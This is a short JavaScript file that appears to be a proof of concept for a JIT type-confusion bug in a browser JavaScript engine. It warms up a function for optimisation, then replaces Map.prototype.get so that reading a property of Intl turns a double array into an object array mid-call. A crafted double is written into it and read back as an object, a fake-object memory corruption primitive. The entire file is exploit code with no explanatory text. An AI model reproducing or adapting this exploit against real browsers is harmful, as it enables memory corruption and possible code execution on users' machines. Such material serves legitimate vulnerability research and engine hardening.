function opt(arr, obj) {
    arr[0] = 1.1;
    obj.x;
    arr[0] = 2.3023e-320;
}

let arr = [1.1];
for (let i = 0; i < 0x10000; i++) {
    opt(arr, {});
}

let get = Map.prototype.get;
Map.prototype.get = function (key) {
    Map.prototype.get = get;

    arr[0] = {};

    return this.get(key);
};

opt(arr, Intl);

alert(arr[0]);